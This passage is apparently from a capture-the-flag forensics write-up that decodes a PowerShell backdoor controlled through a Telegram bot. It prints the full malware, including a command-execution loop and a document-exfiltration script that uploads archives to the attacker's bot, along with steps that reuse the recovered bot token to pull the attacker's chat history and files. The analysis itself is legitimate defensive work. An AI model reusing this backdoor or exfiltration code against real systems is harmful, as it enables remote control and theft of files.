PWlybSAoInswfXsyfXs0fXszfXsxfXs1fSItZidodHRwczovL2lmY29uJywnL2knLCdmaScsJ21lJywnZy4nLCdwJyk7aWYoLW5vdCAoTmV3LU9iamVjdCBTeXN0ZW0uVGhyZWFkaW5nLk11dGV4KCRmYWxzZSwkRjIpKS5XYWl0T25lKDEpKXtleGl0fTtpZigkajIgLWFuZCAkRjIpe2lybSAtVXJpICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkaTApL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JCgkajUxKSZ0ZXh0PSRGMiA7OyAkZW52OkNPTVBVVEVSTkFNRSByZWNvbm5lY3RlZCEgIn1lbHNleyRGMj1bZ3VpZF06Ok5ld0d1aWQoKS5ndWlkO1NldC1JdGVtUHJvcGVydHkgKCgoInsxfXszfXs0fXswfXsyfSItZidvJywnSEtDVScsJ25tZW50JywnOkdGYUdGYUVuJywndmlyJykpLlJFcGxBY2UoJ0dGYScsW1N0cmlOR11bY0hBcl05MikpIC1uYW1lICgiezB9ezF9Ii1mJ0cnLCdVSUQnKSAtdmFsdWUgJEYyO2lybSAtVXJpICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkaTApL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JCgkajUxKSZ0ZXh0PSRGMiA7OyAkZW52OkNPTVBVVEVSTkFNRSBuZXcgY29ubmVjdGlvbiEgIn07aWYoJGoyIC1pc25vdCBbaW50XSl7JGoyPTB9O3doaWxlKDEpeyhpcm0gLVVyaSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCQoJGkwKS9nZXRVcGRhdGVzIikucmVzdWx0fCV7aWYoJGoyIC1sdCAkXy51cGRhdGVfaWQpeyRqMj0kXy51cGRhdGVfaWQ7JHU2LCRyND0kXy5tZXNzYWdlLnRleHQgLXNwbGl0ICI7OyI7aWYoKCR1NiAtbGlrZSAkZzIpIC1vciAoJHU2IC1saWtlICRlbnY6Q09NUFVURVJOQU1FKSAtb3IgKCR1NiAtbGlrZSAkRjIpIC1vciAoJHU2IC1saWtlICJhbGwiKSl7JHIwPSQoJHI0fGlleCkyPiYxfE91dC1TdHJpbmc7aWYoIiIgLWVxICRyMCl7JHIwPSgiezF9ezB9ezJ9IiAtZiAnbicsJ1Rhc2sgRG8nLCdlISEnKX0kdTg9MDt3aGlsZSgkdTggLWx0ICRyMC5MZW5ndGgpeyRyMT0zOTk5O2lmKCgkcjErJHU4KS1ndCAkcjAuTGVuZ3RoKXskcjE9JHIwLkxlbmd0aCUzOTk5fWlybSAtVXJpICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkaTApL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JCgkajUxKSZ0ZXh0PSRGMiA6ICQoJF8ubWVzc2FnZS5tZXNzYWdlX2lkKWBuJCgkcjAuU3Vic3RyaW5nKCR1OCwkcjEpKSAiOyR1OCs9JHIxfX19U2V0LUl0ZW1Qcm9wZXJ0eSAoKCgiezB9ezN9ezF9ezJ9ezR9IiAtZidIS0NVOnZRRicsJ0ZFbnZpcicsJ29ubWUnLCd2UScsJ250JykpLnJlUExBQ2UoJ3ZRRicsW1NUUmluR11bQ2hBcl05MikpIC1uYW1lICgiezB9ezF9Ii1mICdVJywncGRhdGUnKSAtdmFsdWUgJGoyfX0=')))";
vsO4d=Ss83.Run("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe iex $env:lyzqh",0,1);
}catch(e){}close();

{% endhighlight %}

Here, we are mostly interested in the Base64 encoded string, which we decode in CyberChef (From Base64)

{% highlight powershell %}
[System.Net.ServicePointManager]::SecurityProtocol=@(("{1}{0}" -f'12','Tls'),("{1}{0}"-f 's11','Tl'),"Tls",("{0}{1}" -f'Ssl','3'));
$a1=gp ((("{1}{3}{0}{4}{2}{5}" -f 'ntk','HKCU','ro',':','ntkEnvi','nment')).rEpLaCe(([cHar]110+[cHar]116+[cHar]107),'\'));
$j2=$a1.Update;
$F2=$a1.guid;
$y3=$a1.tid;
$j5=$a1.hid;
$g1=$a1.bid;
function h1($j0){$v4=[System.Security.Cryptography.HashAlgorithm]::Create('md5');
$x3=$v4.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($j0));
$n6=[System.BitConverter]::ToString($x3);
return $n6.Replace('-','')};
function s9($n1,$x8){$k7=gi $n1;
foreach($b5 in $k7.Property){$u6=$k7.Name+";
"+$b5;
$x3=h1 $u6;
if($x8 -eq $x3){return ((gp $n1 -Name $b5).$b5)}}foreach($n2 in $k7.GetSubkeyNames()){$v8=s9 ($n1+"\"+$n2) $x8;
if($v8.Length -gt 0){return $v8}}return ""};
function n9{param([byte[]]$n3)$c4=New-Object System.IO.MemoryStream($n3,0,$n3.Length);
$c5=New-Object Byte[](32);
$x2=$c4.Read($c5,0,$c5.Length);
if($x2 -ne $c5.Length){exit}$b5=New-Object System.Security.Cryptography.Rfc2898DeriveBytes($m0,$c5);
$b7=$b5.GetBytes(32);
$v9=$b5.GetBytes(16);
$h5=New-Object Security.Cryptography.AesManaged;
$e3=$h5.CreateDecryptor($b7,$v9);
$w5=New-Object IO.MemoryStream;
$q7=New-Object System.Security.Cryptography.CryptoStream($c4,$e3,[System.Security.Cryptography.CryptoStreamMode]::Read);
$q7.CopyTo($w5);
$w5.Position=0;
$y5=New-Object IO.StreamReader($w5);
$u9=$y5.ReadToEnd();
$y5.Dispose();
$q7.Dispose();
$w5.Dispose();
$c4.Dispose();
return $u9};
$m0=s9 ((("{2}{0}{8}{5}{3}{1}{9}{6}{4}{7}"-f 'C','qIoclassesqIo','HK','e','rfac','r','e','e','U:qIosoftwa','Int')).REPlacE(([CHaR]113+[CHaR]73+[CHaR]111),[String][CHaR]92)) ("{0}{3}{5}{1}{2}{7}{4}{6}{8}" -f'6ca2','f6f6','465afb8','4d7c','cd1b','7','0c','2da','71f');
$g11=n9 $g1;
$j51=n9 $j5;
$y31=n9 $y3;
$i0="$g11`:$y31";
$g2=irm ("{0}{2}{4}{3}{1}{5}"-f'https://ifcon','/i','fi','me','g.','p');
if(-not (New-Object System.Threading.Mutex($false,$F2)).WaitOne(1)){exit};
if($j2 -and $F2){irm -Uri "https://api.telegram.org/bot$($i0)/sendMessage?chat_id=$($j51)&text=$F2 ;
;
 $env:COMPUTERNAME reconnected! "}else{$F2=[guid]::NewGuid().guid;
Set-ItemProperty ((("{1}{3}{4}{0}{2}"-f'o','HKCU','nment',':GFaGFaEn','vir')).REplAce('GFa',[StriNG][cHAr]92)) -name ("{0}{1}"-f'G','UID') -value $F2;
irm -Uri "https://api.telegram.org/bot$($i0)/sendMessage?chat_id=$($j51)&text=$F2 ;
;
 $env:COMPUTERNAME new connection! "};
if($j2 -isnot [int]){$j2=0};
while(1){(irm -Uri "https://api.telegram.org/bot$($i0)/getUpdates").result|%{if($j2 -lt $_.update_id){$j2=$_.update_id;
$u6,$r4=$_.message.text -split ";
;
";
if(($u6 -like $g2) -or ($u6 -like $env:COMPUTERNAME) -or ($u6 -like $F2) -or ($u6 -like "all")){$r0=$($r4|iex)2>&1|Out-String;
if("" -eq $r0){$r0=("{1}{0}{2}" -f 'n','Task Do','e!!')}$u8=0;
while($u8 -lt $r0.Length){$r1=3999;
if(($r1+$u8)-gt $r0.Length){$r1=$r0.Length%3999}irm -Uri "https://api.telegram.org/bot$($i0)/sendMessage?chat_id=$($j51)&text=$F2 : $($_.message.message_id)`n$($r0.Substring($u8,$r1)) ";
$u8+=$r1}}}Set-ItemProperty ((("{0}{3}{1}{2}{4}" -f'HKCU:vQF','FEnvir','onme','vQ','nt')).rePLACe('vQF',[STRinG][ChAr]92)) -name ("{0}{1}"-f 'U','pdate') -value $j2}}
{% endhighlight %}

What we are looking for here it this line of code `$h5=New-Object Security.Cryptography.AesManaged;`

{% include htb_flag.html id="5" description="What algorithm/encryption scheme is used in the final payload?" flag="AES" %}

### [6/10] What is the full path of the key containing the password to derive the encryption key?
If not evident immediately from the output of the previous PowerShell, the malware uses the users `ENVIRONMENT` variable to store information: `bid`, `hid`, `tid`, `GUID` and `Update`.

![Registry Explorer](/img/htb/challenges/counter-defensive/registry_explorer_run_5.png)

We need to deduce which part of registry it looks at; so let's somewhat deobfuscate so we can run it and write out some information.

{% highlight powershell %}
$a1=gp "HKCU:\\Environment"
$j2=$a1.Update;
$F2=$a1.guid;
$y3=$a1.tid;
$j5=$a1.hid;
$g1=$a1.bid;


function h1($j0){$v4=[System.Security.Cryptography.HashAlgorithm]::Create('md5');
$x3=$v4.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($j0));
$n6=[System.BitConverter]::ToString($x3);


return $n6.Replace('-','')};
function s9($n1,$x8){$k7=gi $n1;
foreach($b5 in $k7.Property){$u6=$k7.Name+";
"+$b5;
$x3=h1 $u6;
if($x8 -eq $x3){Write-Host $n1;
 Write-Host $b5;
 return ((gp $n1 -Name $b5).$b5)}}
foreach($n2 in $k7.GetSubkeyNames()){$v8=s9 ($n1+"\"+$n2) $x8;

if($v8.Length -gt 0){write-host $v8;
 return $v8}}return ""};
function n9{param([byte[]]$n3)$c4=New-Object System.IO.MemoryStream($n3,0,$n3.Length);
$c5=New-Object Byte[](32);

$x2=$c4.Read($c5,0,$c5.Length);
if($x2 -ne $c5.Length){exit}write-host $m0;


$b5=New-Object System.Security.Cryptography.Rfc2898DeriveBytes($m0,$c5);
$b7=$b5.GetBytes(32);
$v9=$b5.GetBytes(16);
$h5=New-Object Security.Cryptography.AesManaged;
$e3=$h5.CreateDecryptor($b7,$v9);

$w5=New-Object IO.MemoryStream;
$q7=New-Object System.Security.Cryptography.CryptoStream($c4,$e3,[System.Security.Cryptography.CryptoStreamMode]::Read);

$q7.CopyTo($w5);
$w5.Position=0;
$y5=New-Object IO.StreamReader($w5);
$u9=$y5.ReadToEnd();
$y5.Dispose();
$q7.Dispose();
$w5.Dispose();
$c4.Dispose();
return $u9};

$m0=s9 "HKCU:\software\classes\Interface" "6ca24d7c7f6f6465afb82dacd1b0c71f";

<# Write Host Output #>

HKCU:\software\classes\Interface\{a7126d4c-f492-4eb9-8a2a-f673dbdd3334}\TypeLib
(default)
{BAE13F6C-0E2A-4DEB-AA46-B8F55319347C}
{BAE13F6C-0E2A-4DEB-AA46-B8F55319347C}

{% endhighlight %}

{% include htb_flag.html id="6" description="What is the full path of the key containing the password to derive the encryption key?" flag="HKEY_CURRENT_USER\software\classes\Interface\{a7126d4c-f492-4eb9-8a2a-f673dbdd3334}\TypeLib" %}

### [7/10] What is the attacker's Telegram username?

As stated earlier, there are some values stored in registry - some of it holds the authentication for the malware to communicate with the Telegram C2.
`$g11` contains the bot id, `$y31` is the authentication key for the bot (`$i0` is the concatenated auth string), `$j51` is the chat id.

{% highlight powershell %}
$g11, $y31, $j51 
703...REDACTED...918
AAE...REDACTED...cy4
695..REDACTED...141
{% endhighlight %}

The idea is then to explore the Telegram API and figure out how the bot communicates with the attacker. The assumption is that it uses a private chat / group with the attacker. [This resource](https://checkmarx.com/blog/how-we-were-able-to-infiltrate-attacker-telegram-bots/) elaborates much more on this topic.

During the CTF there was a lot of activity with this bot, so the `getUpdates` endpoint with Telegram had some information, but the "proper" way was probably to look at the conversation history and retrieve that information. So, let's use the API key informations that we have to use `forwardMessage`, to send data from an old chat to our own account. To do that, we need to find the bot username.

{% highlight powershell %}
(irm -Uri "https://api.telegram.org/bot$($i0)/getMe").Result

id                          : 703...REDACTED...918
is_bot                      : True
first_name                  : HTBot-01
username                    : ca1_htbot
can_join_groups             : True
can_read_all_group_messages : False
supports_inline_queries     : False
can_connect_to_business     : False

{% endhighlight %} 

Then we can search up `ca1_htbot` on Telegram, and start a conversation with the bot.

![Telegram](/img/htb/challenges/counter-defensive/telegram_1.png)

To do that, we need our chat id - this can be fetched from the `getUpdates` endpoint, followed by a forwarding of the messages in the bot and attacker chat.

{% highlight powershell %}
1..50 | % { iwr -Uri "https://api.telegram.org/bot$($i0)/forwardMessage" -Method POST -ContentType "application/json" -Body ('{"from_chat_id":$j51, "chat_id":$personalchatID, "message_id":' + $_ + '}') } 
{% endhighlight %}

Then we should see messages starting to pop in, in our chat with the bot:

![Telegram](/img/htb/challenges/counter-defensive/telegram_2.png)

{% include htb_flag.html id="7" description=" What is the attacker's Telegram username?" flag="Pirate_D_Mylan" %}

### [8/10] What day did the attacker's server first send a 'new-connection' message?

Basically, the assumption was on the day that matches all other timestamps during forensics, so on the 18th. But we can validate the question against the original timestamp of the message:

![Telegram](/img/htb/challenges/counter-defensive/telegram_3.png)

{% include htb_flag.html id="8" description="What day did the attacker's server first send a 'new-connection' message?" flag="18/04/2024" %}

### [9/10] What's the password for the 7z archive?

I loved this one, because it is so obvious that it's easy to overlook. The first assumptions would be some execution artifacts on the `ad1` dump, but since we're in Telegram mode, let's have a look there:

![Telegram](/img/htb/challenges/counter-defensive/telegram_4.png)

There we have some obfuscated code, followed by a file upload - so probably something we need to look a bit more into.

Using CyberChef and `From Base64` + `Raw Inflate` we can take the encoded part of the script and deobfuscate it to:

{% highlight powershell %}
[System.Net.ServicePointManager]::SecurityProtocol=@("Tls12","Tls11","Tls","Ssl3")
$a1=gp "HKCU:\\Environment"
function h1($j0) {
    $v4 = [System.Security.Cryptography.HashAlgorithm]::Create('md5')
    $x3 = $v4.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($j0))
    $n6 = [System.BitConverter]::ToString($x3)
    return $n6.Replace('-', '')
}
$j2=$a1.Update
$F2=$a1.guid
$g1=$a1.bid
$y3=$a1.tid
$j5=$a1.hid
function s9($n1, $x8) {
    $k7 = gi $n1
    foreach($b5 in $k7.Property){ 
        $u6 = $k7.Name + ";" + $b5
        $x3 = h1 $u6
        if($x8 -eq $x3){
            return ((gp $n1 -Name $b5).$b5)
        }
    }
    foreach($n2 in $k7.GetSubkeyNames()){
        $v8 = s9 ($n1 + "\" + $n2) $x8
        if($v8.Length -gt 0){
            return $v8
        }
    }
    return ""
}
$m0 = s9 "HKCU:\software\classes\Interface" "6ca24d7c7f6f6465afb82dacd1b0c71f"
function n9 {
    param (
        [byte[]]$n3
    )
    $c4 = New-Object System.IO.MemoryStream($n3, 0, $n3.Length)
    $c5 = New-Object Byte[](32)
    $x2 = $c4.Read($c5, 0, $c5.Length)
    if ($x2 -ne $c5.Length) {
        exit
    }
    $b5 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($m0, $c5)
    $b7  = $b5.GetBytes(32)
    $v9   = $b5.GetBytes(16)
    $h5 = New-Object Security.Cryptography.AesManaged
    $e3 = $h5.CreateDecryptor($b7, $v9)
    $w5 = New-Object IO.MemoryStream
    $q7 = New-Object System.Security.Cryptography.CryptoStream(
        $c4, $e3, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $q7.CopyTo($w5)
    $w5.Position = 0
    $y5 = New-Object IO.StreamReader($w5)
    $u9 = $y5.ReadToEnd()
    $y5.Dispose()
    $q7.Dispose()
    $w5.Dispose()
    $c4.Dispose()
    return $u9
}
$j51 = n9 $j5
$y31 = n9 $y3
$g11 = n9 $g1
$i0 = "$g11`:$y31"
$s74=@('.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf')
$l01="$env:temp\documents_$((Get-Date).ToString('yyyyMMddHHmmss')).csv"
$w51="$env:temp\documents_$((Get-Date).ToString('yyyyMMddHHmmss')).7z"
$h75=$env:temp
$w51s=Get-ChildItem -Path ([System.IO.Path]::Combine($env:USERPROFILE,'Documents')) -Recurse -ErrorAction SilentlyContinue|Where-Object{$s74 -contains $_.Extension}|Select-Object Name,FullName,LastWriteTime,Length
$w51s|Export-Csv -Path $l01 -Encoding Unicode
$w51s|ForEach-Object{Copy-Item -Path $_.FullName -Destination ([System.IO.Path]::Combine($h75,$_.Name)) -Force}
$v13=[System.Text.Encoding]::ascii
& 'C:\Program Files\7-Zip\7z.exe' a -t7z -mx5 -parameter-none $w51 $l01 $w51s.FullName|Out-Null
Add-Type -AssemblyName System.Net.Http
$form=new-object System.Net.Http.MultipartFormDataContent
$form.Add($(New-Object System.Net.Http.StringContent $j51),'chat_id')
$Content=[System.IO.File]::ReadAllBytes($w51)
$n82=New-Object System.Net.Http.ByteArrayContent ($Content,0,$Content.Length)
$n82.Headers.Add('Content-Type','text/plain')
$m63=$v13.getstring($v13.getbytes("$($env:COMPUTERNAME).7z"))
$form.Add($n82,'document',$m63)
$ms=new-object System.IO.MemoryStream
$form.CopyToAsync($ms).Wait()
irm -Method Post -Body $ms.ToArray() -Uri "https://api.telegram.org/bot$i0/sendDocument" -ContentType $form.Headers.ContentType.ToString()
$w51s|ForEach-Object{Remove-Item -Path ([System.IO.Path]::Combine($h75,$_.Name)) -Force}
ri -Path $l01 -Force
ri -Path $w51 -Force

{% endhighlight %}

From which this segment is the important one `& 'C:\Program Files\7-Zip\7z.exe' a -t7z -mx5 -parameter-none $w51 $l01 $w51s.FullName|Out-Null`

According to the 7zip documentation, `-p` passes a password with commandline. 

{% highlight powershell %}
7z --help

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20

Usage: 7z <command> [<switches>...] <archive_name> [<file_names>...] [@listfile]

<Commands>
  a : Add files to archive
  b : Benchmark
  d : Delete files from archive
  e : Extract files from archive (without using directory names)
  h : Calculate hash values for files
  i : Show information about supported formats
  l : List contents of archive
  rn : Rename files in archive
  t : Test integrity of archive
  u : Update files to archive
  x : eXtract files with full paths

<Switches>
  ... TRUNCATED ...
  -p{Password} : set Password
  ... TRUNCATED ...
{% endhighlight %}

Hidden in plain sight.

{% include htb_flag.html id="9" description="What's the password for the 7z archive?" flag="arameter-none" %}

### [10/10] Submit the md5sum of the 2 files in the archive that the attacker exfiltrated.

Here we need to find some of the files that has been shared from the compromised system.
During the CTF the method was simply bruteforcing download of the files from the attackers chat.

{% highlight powershell %}
1..23 | % { $_; iwr "https://api.telegram.org/file/bot$($i0)/documents/file_$_.7z" -OutFile file_$_.7z }

gci *.7z

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/21/2024  11:34 PM        3627866 file_10.7z
-a----         5/21/2024  11:34 PM        3627868 file_11.7z
-a----         5/21/2024  11:34 PM        3627866 file_12.7z
-a----         5/21/2024  11:35 PM        3627868 file_17.7z
-a----         5/21/2024  11:35 PM        3627869 file_19.7z
-a----         5/21/2024  11:34 PM        3627866 file_2.7z
-a----         5/21/2024  11:35 PM        3627865 file_20.7z
-a----         5/21/2024  11:35 PM        3627868 file_21.7z
-a----         5/21/2024  11:35 PM          65536 file_22.7z
-a----         5/21/2024  11:35 PM        3627866 file_23.7z
-a----         5/21/2024  11:34 PM        3627867 file_3.7z
-a----         5/21/2024  11:34 PM        3627868 file_4.7z
-a----         5/21/2024  11:34 PM        3627867 file_5.7z
-a----         5/21/2024  11:34 PM        3627866 file_6.7z
-a----         5/21/2024  11:34 PM        3627866 file_7.7z
-a----         5/21/2024  11:34 PM        3627866 file_8.7z
-a----         5/21/2024  11:34 PM        3627867 file_9.7z

{% endhighlight %}

Once we have the files extracted we can grab the MD5

{% highlight powershell %}
Get-FileHash -Algorithm MD5 .\documents_20240418220516.csv,.\Explosive_Materials_Acquisition_Report_Final_Stylish.pdf

Algorithm       Hash
---------       ----
MD5             83AA3B16BA6A648C133839C8F4AF6AF9
MD5             FFCEDF790CE7FE09E858A7EE51773BCD
{% endhighlight %}

After the CTF, it was clear that Telegram stores files in the chat as well - so that was another way of getting them.
![Telegram](/img/htb/challenges/counter-defensive/telegram_5.png)

{% include htb_flag.html id="10" description="Submit the md5sum of the 2 files in the archive that the attacker exfiltrated." flag="83aa3b16ba6a648c133839c8f4af6af9_ffcedf790ce7fe09e858a7ee51773bcd" %}